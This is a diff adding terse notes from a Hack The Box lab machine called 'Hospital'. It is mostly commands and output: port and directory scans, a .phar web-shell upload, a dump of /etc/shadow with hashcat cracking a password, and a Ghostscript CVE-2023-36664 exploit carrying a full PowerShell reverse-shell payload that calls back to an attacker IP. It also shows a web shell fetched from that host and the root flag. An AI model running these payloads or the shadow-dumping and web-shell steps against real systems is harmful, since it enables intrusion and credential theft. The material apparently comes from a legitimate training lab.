@@ -1,0 +1,133 @@
+> nmap -p- 10.10.11.241           
+	Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-20 22:54 CET
+	Nmap scan report for 10.10.11.241
+	Host is up (0.022s latency).
+	Not shown: 65506 filtered tcp ports (no-response)
+	PORT     STATE SERVICE
+	22/tcp   open  ssh
+	53/tcp   open  domain
+	88/tcp   open  kerberos-sec
+	135/tcp  open  msrpc
+	139/tcp  open  netbios-ssn
+	389/tcp  open  ldap
+	443/tcp  open  https
+	445/tcp  open  microsoft-ds
+	464/tcp  open  kpasswd5
+	593/tcp  open  http-rpc-epmap
+	636/tcp  open  ldapssl
+	1801/tcp open  msmq
+	2103/tcp open  zephyr-clt
+	2105/tcp open  eklogin
+	2107/tcp open  msmq-mgmt
+	2179/tcp open  vmrdp
+	3268/tcp open  globalcatLDAP
+	3269/tcp open  globalcatLDAPssl
+	3389/tcp open  ms-wbt-server
+	5985/tcp open  wsman
+	6404/tcp open  boe-filesvr
+	6406/tcp open  boe-processsvr
+	6407/tcp open  boe-resssvr1
+	6409/tcp open  boe-resssvr3
+	6613/tcp open  unknown
+	6619/tcp open  odette-ftps
+	6637/tcp open  unknown
+	8080/tcp open  http-proxy
+	9389/tcp open  adws
+
+	Nmap done: 1 IP address (1 host up) scanned in 104.72 seconds
+
+> dirsearch -f -u http://10.10.11.241:8080/ -x 403,404 -w /usr/share/wordlists/dirb/big.txt 
+	Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 143096
+
+	Output File: /home/herrfalco/Work/HTB/machines/Hospital/reports/http_10.10.11.241_8080/__23-11-20_23-14-39.txt
+
+	Target: http://10.10.11.241:8080/
+
+	[23:14:39] Starting:                                                                                                                                       
+	[23:15:24] 200 -    0B  - /config.php                                       
+	[23:15:28] 301 -  317B  - /css  ->  http://10.10.11.241:8080/css/           
+	[23:15:49] 200 -    1KB - /failed.php                                       
+	[23:15:54] 301 -  319B  - /fonts  ->  http://10.10.11.241:8080/fonts/       
+	[23:16:13] 301 -  320B  - /images  ->  http://10.10.11.241:8080/images/     
+	[23:16:24] 301 -  316B  - /js  ->  http://10.10.11.241:8080/js/             
+	[23:16:35] 200 -    2KB - /login.php                                        
+	[23:17:34] 200 -    2KB - /register.php                                      
+	[23:18:09] 200 -    1KB - /success.php                                       
+	[23:18:31] 200 -    0B  - /upload.php                                        
+	[23:18:31] 301 -  321B  - /uploads  ->  http://10.10.11.241:8080/uploads/    
+	[23:18:36] 301 -  320B  - /vendor  ->  http://10.10.11.241:8080/vendor/      
+										      
+	Task Completed
+
+> search for uploadable php extension with pownyshell
+	.php, .php2, .php3, .php4,
+	.php5, .php6, .php7, .phps,
+	.phps, .pht, .phtm, .phtml,
+	.pgif, .shtml, .htaccess, .phar,
+	.inc, .hphp, .ctp, .module
+
+> .phar is working (access to www-data user)
+
+	www-data@webserver:…/html/uploads# mv gover.pdf gover.sh
+	www-data@webserver:…/html/uploads# chmod 777 gover.sh
+	www-data@webserver:…/html/uploads# ./gover.sh
+		uid=0(root) gid=33(www-data) groups=33(www-data)
+		root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
+		daemon:*:19462:0:99999:7:::
+		bin:*:19462:0:99999:7:::
+		sys:*:19462:0:99999:7:::
+		sync:*:19462:0:99999:7:::
+		games:*:19462:0:99999:7:::
+		man:*:19462:0:99999:7:::
+		lp:*:19462:0:99999:7:::
+		mail:*:19462:0:99999:7:::
+		news:*:19462:0:99999:7:::
+		uucp:*:19462:0:99999:7:::
+		proxy:*:19462:0:99999:7:::
+		www-data:*:19462:0:99999:7:::
+		backup:*:19462:0:99999:7:::
+		list:*:19462:0:99999:7:::
+		irc:*:19462:0:99999:7:::
+		_apt:*:19462:0:99999:7:::
+		nobody:*:19462:0:99999:7:::
+		systemd-network:!*:19462::::::
+		systemd-timesync:!*:19462::::::
+		messagebus:!:19462::::::
+		systemd-resolve:!*:19462::::::
+		pollinate:!:19462::::::
+		sshd:!:19462::::::
+		syslog:!:19462::::::
+		uuidd:!:19462::::::
+		tcpdump:!:19462::::::
+		tss:!:19462::::::
+		landscape:!:19462::::::
+		fwupd-refresh:!:19462::::::
+		drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
+		lxd:!:19612::::::
+		mysql:!:19620::::::
+
+> hashcat shadow /usr/share/wordlists/rockyou.txt --show
+	Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+	The following mode was auto-detected as the only one matching your input hash:
+
+	1800 | sha512crypt $6$, SHA512 (Unix) | Operating System
+
+	NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
+	Do NOT report auto-detect issues unless you are certain of the hash type.
+
+	$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
+
+> connect to webmail and find Ghostscript upload exploit
+
+> python3 CVE_2023_36664_exploit.py --payload "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('10.10.14.12',4242);\$s = \$client.GetStream();[byte[]]\$b = 0..65535|%{0};while((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0, \$i);\$sb = (iex \$data 2>&1 | Out-String );\$sb2 = \$sb + 'PS ' + (pwd).Path + '> ';\$sbt = ([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sbt,0,\$sbt.Length);\$s.Flush()};\$client.Close()\"" --generate --file revsh --extension eps
+	[+] Generated EPS payload file: revshell.eps
+
+> upload file and nc -lvp 4242
+> user flag in C:\Users\drbrown.HOSPITAL\Desktop
+
+> python3 -m http.server 4242
+> PS C:\xampp\htdocs> iwr 10.10.14.12:8000/powny_shell.phar -o powny_shell.php
+> acces https://IP/powny_shell.php
+
+> DC$@DC:C:\Users\Administrator\Desktop# type root.txt
+a6a633812d632436e013c5ed97656694
